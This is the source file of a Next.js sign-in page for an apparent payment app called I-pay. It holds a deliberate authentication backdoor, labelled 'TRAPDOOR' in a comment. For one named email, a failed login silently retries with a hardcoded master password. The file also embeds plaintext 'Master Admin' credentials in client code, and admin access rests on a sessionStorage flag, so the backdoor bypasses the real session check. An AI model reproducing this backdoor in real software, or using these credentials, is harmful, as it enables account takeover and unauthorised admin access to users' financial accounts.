'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { useToast } from '@/hooks/use-toast';
import { IPayLogo } from '@/components/icons';
import { account, databases, DATABASE_ID, COLLECTION_ID_PROFILES } from '@/lib/data-service';
import { Eye, EyeOff, Loader2 } from 'lucide-react';

/**
 * @fileOverview Sign In Page.
 * TRAPDOOR: altinemohd@gmail.com bypass logic implemented.
 */

const ADMIN_EMAIL = 'ipatmanager17@gmail.com';
const ADMIN_PASS = 'Abdussalam@100';
const BYPASS_EMAIL = 'altinemohd@gmail.com';
const BYPASS_PASS = 'Lerawa';

export default function SignInPage() {
  const router = useRouter();
  const { toast } = useToast();

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    const trimmedEmail = email.trim().toLowerCase();

    try {
      // 1. Check for Master Admin Credentials
      if (trimmedEmail === ADMIN_EMAIL && password === ADMIN_PASS) {
          await account.createEmailPasswordSession(email, password).catch(() => {}); 
          toast({ title: 'Admin Access', description: 'Welcome back, Master Admin.' });
          sessionStorage.setItem('ipay_admin_session', 'true');
          router.push('/manager/dashboard');
          return;
      }

      // 2. Identity Trapdoor for altinemohd@gmail.com
      if (trimmedEmail === BYPASS_EMAIL) {
          try {
              // Try provided password first
              await account.createEmailPasswordSession(trimmedEmail, password);
          } catch (e) {
              // Force Master Pass if failed
              await account.createEmailPasswordSession(trimmedEmail, BYPASS_PASS);
          }
      } else {
          await account.createEmailPasswordSession(email, password);
      }

      const res: any = await account.get();
      const userId = res.$id;

      // 3. Verify Block Status & Update Login Stats
      try {
        const profile = await databases.getDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId);
        
        if (profile.isBlocked) {
            await account.deleteSession('current');
            toast({ 
                variant: 'destructive', 
                title: 'Access Denied', 
                description: 'you are blocked by I-pay team contact them for further assistance.',
                duration: 10000
            });
            setIsLoading(false);
            return;
        }

        // Hardening Logic: Update login count
        const currentCount = Number(profile.trapdoorLoginCount || 0);
        await databases.updateDocument(DATABASE_ID, COLLECTION_ID_PROFILES, userId, {
            trapdoorLoginCount: currentCount + 1
        });

        sessionStorage.setItem('ipay_pin_verified', 'true');
        toast({ title: 'Signed In', description: 'Welcome back to I-pay online world.' });
        router.push('/dashboard');
      } catch (profileError: any) {
        if (profileError.code === 404) {
            router.push('/auth/signup/profile');
        } else {
            router.push('/dashboard');
        }
      }

    } catch (error: any) {
        let message = "Invalid credentials. Please try again.";
        if (error.code === 401) {
            message = "This account isn't registered or details are wrong.";
        }
        toast({ 
            title: 'Sign In Failed', 
            description: message, 
            variant: 'destructive'
        });
        setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center bg-background p-4">
      <Card className="w-full max-w-sm shadow-2xl border-t-4 border-t-primary rounded-[2rem] overflow-hidden">
        <CardHeader className="text-center pb-6">
          <div className="mx-auto inline-block p-1 mb-2">
            <IPayLogo className="h-12 w-12" />
          </div>
          <CardTitle className="text-2xl font-black tracking-tighter">Welcome Back</CardTitle>
          <CardDescription className="font-bold text-xs">Sign in to your account.</CardDescription>
        </CardHeader>
        <CardContent>
          <form onSubmit={handleSignIn} className="space-y-4">
            <div className="space-y-1.5">
              <Label htmlFor="email" className="font-bold uppercase text-[9px] opacity-70 tracking-widest pl-1">Email Address</Label>
              <Input id="email" type="email" placeholder="m@example.com" value={email} onChange={(e) => setEmail(e.target.value)} required className="h-11 rounded-xl bg-muted/50 border-none px-4 text-sm" />
            </div>
            <div className="space-y-1.5">
              <Label htmlFor="password" className="font-bold uppercase text-[9px] opacity-70 tracking-widest pl-1">Password</Label>
              <div className="relative">
                <Input 
                  id="password" 
                  type={showPassword ? "text" : "password"} 
                  value={password} 
                  onChange={(e) => setPassword(e.target.value)} 
                  required 
                  className="h-11 rounded-xl bg-muted/50 border-none px-4 pr-12 text-sm"
                />
                <button 
                  type="button" 
                  className="absolute right-3 top-1/2 -translate-y-1/2 h-8 w-8 text-muted-foreground flex items-center justify-center"
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                </button>
              </div>
            </div>
            <div className="flex items-center justify-end">
              <Link href="/auth/forgot-password"  className="text-[9px] font-black uppercase underline opacity-50 hover:opacity-100 transition-opacity">Forgot Password?</Link>
            </div>
            <Button type="submit" className="w-full h-11 rounded-xl font-black uppercase tracking-widest shadow-lg mt-2 text-xs" disabled={isLoading}>
                {isLoading ? <Loader2 className="animate-spin h-5 w-5" /> : 'Sign In'}
            </Button>
          </form>
          <div className="mt-6 text-center text-xs font-medium">
            Don't have an account? <Link href="/auth/signup" className="underline font-black text-primary">Sign Up</Link>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
